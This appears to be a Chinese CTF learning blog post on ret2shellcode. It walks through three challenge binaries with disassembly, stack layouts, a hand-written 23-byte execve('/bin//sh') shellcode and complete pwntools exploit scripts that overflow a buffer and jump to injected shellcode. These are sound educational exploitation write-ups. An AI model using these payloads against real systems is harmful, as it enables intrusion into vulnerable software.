---
title: Pwn-ret2shellcode
description: pwn-第4部分ret2shellcode基础知识
date: 2026-05-18 11:59:04
updated: 2026-06-05 18:00:00
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260518052358_813ddd1fbdddfd091b23899281826d1b74e3ea87_raw.jpg
categories: [pwn, 安全]
tags: [ret2shellcode, pwn, 栈溢出]
recommend: 10
---

# ret2shellcode 学习笔记

---

## ret2shellcode 基础概念

> **什么是 ret2shellcode？**
>
> 字面意思就是 **return to shellcode**（返回到 shellcode 去执行）。
> 当程序存在栈溢出，且我们可以控制某块内存区域具备 **RWX**（可读可写可执行）权限时，我们可以将自己编写的机器码（Shellcode）写入该区域，并劫持返回地址跳转过去执行。

---

### 1.1 完整流程演示

```text
                     你输入的数据
                           │
                      ┌────┴────┐
                      ↓         ↓
                 [shellcode]  [覆盖返回地址为 shellcode 地址]
                      │         │
                      └────┬────┘
                           ↓
                     函数执行到 ret
                           ↓
                     rip 跳到 shellcode
                           ↓
                     拿到 shell 🏁
```

---

### 1.2 攻击三步走

| 步骤                | 做的事                                            |
| :------------------ | :------------------------------------------------ |
| **1. 放 shellcode** | 把可执行机器码写到某块内存（如全局变量、栈、堆）  |
| **2. 劫持返回地址** | 覆盖函数返回地址，指向 shellcode 所在的内存地址   |
| **3. 触发**         | 函数执行 `ret`，CPU 跳转到 shellcode 地址开始执行 |

---

### 1.3 必要条件

> 1. **可执行的内存**：shellcode 所在页必须有执行权限（本笔记中的案例通常靠 **`mprotect`** 实现）。
> 2. **控制流劫持**：能够覆盖返回地址或函数指针（本笔记中的案例主要靠 **栈溢出**）。

---

### 1.4 与其他打法的关系

- **ret2shellcode** → 自己造代码（Shellcode）去执行。
- **ret2libc** → 借用 libc 中已有的函数（如 `system`）。
- **ROP** → 拼凑已有的代码片段（Gadgets）完成操作。

---

### 1.5 重点总结与避坑指南

#### 1.5.1 ret2shellcode 适用场景

> - **NX 保护** 未开启或被 `mprotect` 改写。
> - 能够预测或泄露 Shellcode 所在的内存地址。
> - 存在溢出点劫持控制流。

---

#### 1.5.2 避坑指南

| 易错点                   | 原因与影响                                                   |
| :----------------------- | :----------------------------------------------------------- |
| **`send` vs `sendline`** | `sendline` 会多发一个 `\n`，可能污染下一次输入或破坏长度。在 `read` 系统调用下优先使用 `send`。 |
| **`\x00` 截断**          | `strcpy` 类函数遇到 null 字节会停止，导致 Shellcode 传输不全。 |
| **栈对齐**               | 64 位程序在调用函数前要求 **RSP 16 字节对齐**。若 Shellcode 执行异常，可尝试加入 `ret` 垫片。 |
| **Shellcode 长度**       | 缓冲区较小时，优先考虑手写短 Shellcode 或利用 `push` 指令构造。 |

---

### 1.6参考资料

- Pwntools Documentation
- x86-64 System Call Table (execve = 59)
- Shell-storm Shellcode Database



---

## [HNCTF 2022 Week1] ret2shellcode

**题目信息：** https://www.nssctf.cn/problem/2934

---

### 2.1 源码分析

```c
#include<stdio.h>
char buff[256];
int main()
{
    setbuf(stdin,0);
    setbuf(stderr,0);
    setbuf(stdout,0);
    mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7);
    char buf[256];
    memset(buf,0,0x100);
    read(0,buf,0x110);
    strcpy(buff,buf);
    return 0;
}
```

---

### 2.2 关键突破口

> 1. **栈溢出**：本地缓冲区 `buf[256]`，但 `read` 允许读入 **272 字节**，溢出 16 字节。
> 2. **mprotect 赋权**：程序调用 `mprotect` 将 `stdout` GOT 所在页（包含全局变量 `buff`）设为 **7 (RWX)**。
> 3. **全局变量 buff**：通过 `strcpy(buff, buf)`，我们将 Shellcode 成功从栈拷贝到了具备执行权限的 **BSS 段**。

---

### 2.3 保护检查

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled (但被 mprotect 手动绕过)
PIE:        No PIE (地址固定)
```

---

### 2.4 漏洞深度分析

#### 2.4.1 mprotect 细节分析
反汇编显示：
```asm
0x401201: lea rax, [rip + 0x2e58]    ; rax = &stdout = 0x404060
0x401208: and rax, 0xfffffffffffff000 ; rax = 0x404000（页对齐）
0x40120e: mov edx, 7                  ; 权限 RWX
0x401213: mov esi, 0x1000             ; 大小 4KB
0x401218: mov rdi, rax                ; 起始地址 0x404000
0x401220: call mprotect               ; mprotect(0x404000, 0x1000, 7)
```

| 地址           | 用途                                    |
| :------------- | :-------------------------------------- |
| `0x404060`     | `stdout` GOT 入口                       |
| `0x404000`     | 页对齐起始地址                          |
| **`0x4040a0`** | **全局变量 `buff` (落在此 RWX 页内 ✅)** |

#### 2.4.2 栈布局与数据流
**栈布局：**
- 偏移 `0x000` ~ `0x0FF`：`buf[256]` (填充 Shellcode)
- 偏移 `0x100` ~ `0x107`：**saved RBP**
- 偏移 `0x108` ~ `0x10F`：**Return Address** -> 指向 `buff` 地址

---

### 2.5 Exploit 实现

```python
from pwn import *

context(os = "linux", arch = "amd64")
r = process("./shellcode")

shellcode = asm(shellcraft.sh())
buff_addr = 0x4040a0

payload = shellcode + b'\x00'             # strcpy 在此截断
payload = payload.ljust(0x100, b'\x90')   # NOP 填充
payload += p64(0)                          # saved RBP
payload += p64(buff_addr)                 # 跳转执行 shellcode

r.send(payload)   # 注意用 send 而非 sendline
r.interactive()
```

---

## [GDOUCTF 2023] ezshellcode

**题目考点：** ret2shellcode + 栈溢出 + **短 Shellcode 构造**

---

### 3.1 逆向分析 (main 函数)

```asm
; mprotect: 把 stdout 所在页设为 RWX
4006cb: lea    rax, [stdout]       ; 0x601060
4006d2: and    rax, 0xfffffffffffff000  ; 页对齐 → 0x601000
4006ea: call   mprotect(0x601000, 0x1000, 7)

; 第一次输入：37 字节限制
400711: call   read(0, 0x6010a0, 0x25)  ; 读 37 字节到全局 name

; 第二次输入：溢出点
400744: call   read(0, rbp-0xa, 0x40)  ; 读 64 字节到 10 字节栈空间
```

> **关键发现：**
> 1. 全局变量 `name` 在 **RWX 页** 内，但大小仅为 **37 字节**。标准 `shellcraft.sh()` (48B) 放不下。
> 2. 栈溢出空间充足，足以劫持控制流。

---

### 3.2 利用思路：手写短 Shellcode

> 由于空间限制，必须手写 23 字节的 **`execve("/bin//sh", NULL, NULL)`**：

```asm
xor esi, esi                    ; rsi = 0 (argv = NULL)
mov rbx, 0x68732f2f6e69622f    ; rbx = "/bin//sh"
push rsi                        ; 压入 \0
push rbx                        ; 压入字符串
push rsp                        ; rsp 指向字符串
pop rdi                         ; rdi = &"/bin//sh"
push 59                         ; syscall execve
pop rax
xor edx, edx                    ; rdx = 0 (envp = NULL)
syscall
```

---

### 3.3 Exploit 实现

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

r = process('./pwn')

# 23 字节短 shellcode
shellcode = asm("""
    xor esi, esi
    mov rbx, 0x68732f2f6e69622f
    push rsi
    push rbx
    push rsp
    pop rdi
    push 59
    pop rax
    xor edx, edx
    syscall
""")

shellcode_addr = 0x6010a0
ret_gadget     = 0x40074f       # ret 指令用于栈对齐

r.recvuntil(b'Please.\n')
r.send(shellcode)

r.recvuntil(b"Let's start!\n")
payload = flat([
    b'a' * 10,
    b'b' * 8,
    ret_gadget,
    shellcode_addr
])
r.send(payload)
r.interactive()
```

---

## [御网杯2026]PWN3

::alert{icon="tabler:files" color="var(--c-accent)" title="附件地址"}

[下载链接](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/御网杯2026/pwn3)

::

提供了两个版本，一个是shellcode，一个进阶版本的ret2libc，祝师傅玩的开心

---

### 0x01 分析程序

初步分析

![image-20260605174715628](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180540525-993531558.png)

#### main()函数

![image-20260605174736549](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180540150-1763988746.png)

#### vuln()函数

![image-20260605174605138](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180539766-496821549.png)

#### Shift+F12

![image-20260605174901657](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180538993-603758284.png)

已知条件

vuln函数出现栈溢出，同时没有类似system和/bin/sh的字符串，利用ROPgadget也找不到类似字符，但是栈并没有开启NX保护，所以本题就是ret2shellcode

---

### 0x02 EXP构造

```python
from pwn import *

context(os='linux', arch='amd64')

r = process('./vuln')

r.recvuntil(b"Buffer at:")
buf_addr = int(r.recvline().strip(),16)

shell = asm(shellcraft.sh())
ret = 0x0401207
payload = shell.ljust(0x80,b'\x00')+p64(ret)+p64(buf_addr)

r.recvuntil(b"Message: ")
r.sendline(payload)

r.interactive()
```

## 